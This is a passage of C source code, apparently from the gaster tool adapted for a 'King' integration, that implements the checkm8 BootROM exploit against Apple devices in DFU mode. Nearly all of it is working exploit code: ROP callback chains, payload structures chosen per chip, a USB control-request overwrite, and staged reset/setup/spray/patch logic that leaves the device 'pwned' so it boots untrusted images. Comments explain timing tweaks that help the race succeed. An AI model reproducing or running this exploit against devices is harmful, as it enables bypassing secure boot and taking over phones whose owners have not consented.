	for(i = 0; i < callback_cnt; i += 5) {
		block_1_sz = block_0_sz = 0;
		for(j = 0; j < 5; ++j) {
			addr += MAX_BLOCK_SZ / 5;
			if(j == 4) {
				addr += MAX_BLOCK_SZ;
			}
			if(i + j < callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = addr;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else if(i + j == callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else {
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
			}
		}
		memcpy(buf + sz, block_0, block_0_sz);
		sz += block_0_sz;
		memcpy(buf + sz, block_1, block_1_sz);
		sz += block_1_sz;
	}
	return sz;
}

static bool
dfu_send_data(const usb_handle_t *handle, uint8_t *data, size_t len) {
	transfer_ret_t transfer_ret;
	size_t i, packet_sz;

	for(i = 0; i < len; i += packet_sz) {
		packet_sz = MIN(len - i, DFU_MAX_TRANSFER_SZ);
		if(!send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, &transfer_ret) || transfer_ret.ret != USB_TRANSFER_OK || transfer_ret.sz != packet_sz) {
			return false;
		}
	}
	return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle);
}

static bool
read_binary_file(const char *filename, uint8_t **buf, size_t *len) {
	FILE *fp = fopen(filename, "rb");
	bool ret = false;

	if(fp != NULL) {
		if(fseek(fp, 0, SEEK_END) == 0 && (*len = (size_t)ftell(fp)) != 0 && (*buf = malloc(*len)) != NULL) {
			rewind(fp);
			ret = fread(*buf, 1, *len, fp) == *len;
		}
		fclose(fp);
	}
	if(!ret) {
		printf("Cannot read file \"%s\".\n", filename);
	}
	return ret;
}

static bool
checkm8_stage_patch(const usb_handle_t *handle) {
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
	} A9;
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
	} notA9;
	struct {
		uint32_t pwnd[4], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor;
	} notA9_armv7;
	struct {
		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request;
	struct {
		uint32_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request_armv7;
	callback_t callbacks[] = {
		{ write_ttbr0, insecure_memory_base },
		{ tlbi, 0 },
		{ insecure_memory_base + ARM_16K_TT_L2_SZ + ttbr0_sram_off + 2 * sizeof(uint64_t), 0 },
		{ write_ttbr0, ttbr0_addr },
		{ tlbi, 0 },
		{ ret_gadget, 0 }
	};
	size_t i, data_sz, packet_sz, payload_sz, overwrite_sz, payload_handle_checkm8_request_sz;
	uint8_t *data, *payload, *payload_handle_checkm8_request;
	checkm8_overwrite_armv7_t checkm8_overwrite_armv7;
	checkm8_overwrite_t checkm8_overwrite;
	transfer_ret_t transfer_ret;
	bool ret = false;
	void *overwrite;
	uint64_t reg;

	if(cpid == 0x8003 || cpid == 0x8000) {
		if(payload_A9_bin_len > sizeof(A9)) {
			payload = payload_A9_bin;
			payload_sz = payload_A9_bin_len - sizeof(A9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
		if(payload_notA9_bin_len > sizeof(notA9)) {
			payload = payload_notA9_bin;
			payload_sz = payload_notA9_bin_len - sizeof(notA9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else if(payload_notA9_armv7_bin_len > sizeof(notA9_armv7)) {
		payload = payload_notA9_armv7_bin;
		payload_sz = payload_notA9_armv7_bin_len - sizeof(notA9_armv7);
	} else {
		payload = NULL;
		payload_sz = 0;
	}
	if(payload != NULL) {
		if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
			if(payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
				payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
				payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
				if(cpid == 0x8003 || cpid == 0x8000) {
					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				} else {
					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				}
			} else {
				payload_handle_checkm8_request = NULL;
				payload_handle_checkm8_request_sz = 0;
				data = NULL;
			}
		} else if(payload_handle_checkm8_request_armv7_bin_len > sizeof(handle_checkm8_request_armv7)) {
			payload_handle_checkm8_request = payload_handle_checkm8_request_armv7_bin;
			payload_handle_checkm8_request_sz = payload_handle_checkm8_request_armv7_bin_len - sizeof(handle_checkm8_request_armv7);
			data = calloc(1, payload_sz + sizeof(notA9_armv7) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request_armv7));
		} else {
			payload_handle_checkm8_request = NULL;
			payload_handle_checkm8_request_sz = 0;
			data = NULL;
		}
		if(data != NULL) {
			if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				reg = 0x1000006A5;
				memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
				reg = 0x60000100000625;
				memcpy(data + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
				reg = 0x60000180000625;
				memcpy(data + ttbr0_sram_off, &reg, sizeof(reg));
				reg = 0x1800006A5;
				memcpy(data + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
				usb_rop_callbacks(data + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
				data_sz = ttbr0_sram_off + 2 * sizeof(reg);
			} else {
				data_sz = 0;
			}
			memcpy(data + data_sz, payload, payload_sz);
			data_sz += payload_sz;
			if(cpid == 0x8003 || cpid == 0x8000) {
				memset(A9.pwnd, '\0', sizeof(A9.pwnd));
				memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
				A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
				A9.dfu_handle_bus_reset = dfu_handle_bus_reset;
				A9.dfu_handle_request = dfu_handle_request;
				A9.payload_off = payload_sz + sizeof(A9);
				A9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
				A9.memcpy_addr = memcpy_addr;
				A9.gUSBSerialNumber = gUSBSerialNumber;
				A9.usb_create_string_descriptor = usb_create_string_descriptor;
				A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
				A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
				A9.patch_addr = patch_addr;
				memcpy(data + data_sz, &A9, sizeof(A9));
				data_sz += sizeof(A9);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request.handle_interface_request = handle_interface_request;
				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
			} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
				memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
				notA9.dfu_handle_bus_reset = dfu_handle_bus_reset;
				notA9.dfu_handle_request = dfu_handle_request;
				notA9.payload_off = payload_sz + sizeof(notA9);
				notA9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
				notA9.memcpy_addr = memcpy_addr;
				notA9.gUSBSerialNumber = gUSBSerialNumber;
				notA9.usb_create_string_descriptor = usb_create_string_descriptor;
				notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
				notA9.patch_addr = patch_addr;
				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					notA9.patch_addr += ARM_16K_TT_L2_SZ;
				}
				memcpy(data + data_sz, &notA9, sizeof(notA9));
				data_sz += sizeof(notA9);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request.handle_interface_request = handle_interface_request;
				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
			} else {
				memset(notA9_armv7.pwnd, '\0', sizeof(notA9_armv7.pwnd));
				memcpy(notA9_armv7.pwnd, pwnd_str, strlen(pwnd_str));
				notA9_armv7.payload_dest = payload_dest_armv7;
				notA9_armv7.dfu_handle_bus_reset = (uint32_t)dfu_handle_bus_reset;
				notA9_armv7.dfu_handle_request = (uint32_t)dfu_handle_request;
				notA9_armv7.payload_off = (uint32_t)(payload_sz + sizeof(notA9_armv7));
				notA9_armv7.payload_sz = (uint32_t)(payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request_armv7));
				notA9_armv7.memcpy_addr = (uint32_t)memcpy_addr;
				notA9_armv7.gUSBSerialNumber = (uint32_t)gUSBSerialNumber;
				notA9_armv7.usb_create_string_descriptor = (uint32_t)usb_create_string_descriptor;
				notA9_armv7.usb_serial_number_string_descriptor = (uint32_t)usb_serial_number_string_descriptor;
				memcpy(data + data_sz, &notA9_armv7, sizeof(notA9_armv7));
				data_sz += sizeof(notA9_armv7);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request_armv7.handle_interface_request = (uint32_t)handle_interface_request;
				handle_checkm8_request_armv7.insecure_memory_base = (uint32_t)insecure_memory_base;
				handle_checkm8_request_armv7.exec_magic = (uint32_t)EXEC_MAGIC;
				handle_checkm8_request_armv7.done_magic = (uint32_t)DONE_MAGIC;
				handle_checkm8_request_armv7.memc_magic = (uint32_t)MEMC_MAGIC;
				handle_checkm8_request_armv7.memcpy_addr = (uint32_t)memcpy_addr;
				handle_checkm8_request_armv7.usb_core_do_transfer = (uint32_t)usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request_armv7, sizeof(handle_checkm8_request_armv7));
				data_sz += sizeof(handle_checkm8_request_armv7);
			}
			overwrite = NULL;
			overwrite_sz = 0;
			if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000) {
				memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
				checkm8_overwrite.callback.callback = insecure_memory_base;
				overwrite = &checkm8_overwrite;
				overwrite_sz = sizeof(checkm8_overwrite);
			} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
					memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
					checkm8_overwrite.callback.callback = nop_gadget;
					checkm8_overwrite.callback.next = insecure_memory_base;
					overwrite = &checkm8_overwrite;
					overwrite_sz = sizeof(checkm8_overwrite);
				}
			} else {
				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
				overwrite = &checkm8_overwrite_armv7;
				overwrite_sz = sizeof(checkm8_overwrite_armv7);
			}
			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
				ret = true;
				for(i = 0; ret && i < data_sz; i += packet_sz) {
					packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
					ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
				}
				if(ret) {
					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
				}
			}
			free(data);
		}
	}
	return ret;
}

static bool
gaster_checkm8(usb_handle_t *handle) {
	enum {
		STAGE_RESET,
		STAGE_SETUP,
		STAGE_SPRAY,
		STAGE_PATCH,
		STAGE_PWNED
	} stage = STAGE_RESET;
	bool ret, pwned;

	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
	while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
		if(!pwned) {
			if(stage == STAGE_RESET) {
				puts("Stage: RESET");
				ret = checkm8_stage_reset(handle);
				stage = STAGE_SETUP;
			} else if(stage == STAGE_SETUP) {
				puts("Stage: SETUP");
				ret = checkm8_stage_setup(handle);
				stage = STAGE_SPRAY;
			} else if(stage == STAGE_SPRAY) {
				puts("Stage: SPRAY");
				ret = checkm8_stage_spray(handle);
				stage = STAGE_PATCH;
			} else {
				puts("Stage: PATCH");
				ret = checkm8_stage_patch(handle);
				stage = STAGE_RESET;
			}
			if(ret) {
				puts("ret: true");
			} else {
				puts("ret: false");
				stage = STAGE_RESET;
			}
			reset_usb_handle(handle);
		} else {
			stage = STAGE_PWNED;
			puts("Now you can boot untrusted images.");
		}
		close_usb_handle(handle);
	}
	return stage == STAGE_PWNED;
}


/*
 * King integration entry point. Runs the gaster checkm8 exploit against a
 * device in DFU mode. Honours USB_TIMEOUT / USB_ABORT_TIMEOUT_MIN env vars.
 *
 * NOTE: the default usb_timeout is raised from gaster's 5ms to 100ms. On
 * pure-xHCI hosts (no EHCI) the adaptive abort-timeout sweep needs a wider
 * range to find the window that lands the exploit; 5ms often never finds it.
 * Returns 0 on success (device in pwned DFU mode), -1 on failure.
 */
int
king_gaster_checkm8(void) {
	char *env_usb_timeout = getenv("USB_TIMEOUT"), *env_usb_abort_timeout_min = getenv("USB_ABORT_TIMEOUT_MIN");
	usb_handle_t handle;
	int __ret;

#if defined(_WIN32)
	/* checkm8's leak race relies on sub-millisecond abort timing, but the
	 * default Windows scheduler/timer granularity is ~15.6ms, which quantises
	 * every Sleep()/event timeout and makes the race impossible to win.
	 * Raise the timer resolution to 1ms for the duration of the exploit. */
	timeBeginPeriod(1);
#endif

	if(env_usb_timeout == NULL || sscanf(env_usb_timeout, "%u", &usb_timeout) != 1 || usb_timeout < 1) {
		usb_timeout = 100;
	}
	printf("usb_timeout: %u\n", usb_timeout);
	if(env_usb_abort_timeout_min == NULL || sscanf(env_usb_abort_timeout_min, "%u", &usb_abort_timeout_min) != 1 || usb_abort_timeout_min > usb_timeout) {
		usb_abort_timeout_min = 0;
	}
	printf("usb_abort_timeout_min: %u\n", usb_abort_timeout_min);
	__ret = gaster_checkm8(&handle) ? 0 : -1;
#if defined(_WIN32)
	timeEndPeriod(1);
#endif
	return __ret;
}
